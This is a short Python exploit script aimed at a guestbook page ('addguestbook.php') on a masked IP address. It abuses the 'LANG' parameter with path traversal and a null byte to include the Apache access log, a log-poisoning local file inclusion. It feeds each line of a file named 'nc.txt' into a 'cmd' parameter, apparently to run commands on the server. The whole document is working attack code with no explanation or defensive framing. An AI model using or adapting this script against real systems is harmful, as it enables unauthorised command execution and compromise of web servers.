import requests
import re

line=''
url1='http://xx.xx.xx.xx/addguestbook.php?name=a&comment=aaaaa&cmd='
url2='&LANG=/../../../../../../../xampp/apache/logs/access.log%00Submit=Submit'

echofile=open("nc.txt", "r")

for x in echofile:
    line=echofile.readline()
    r=requests.get(url1+line+url2)
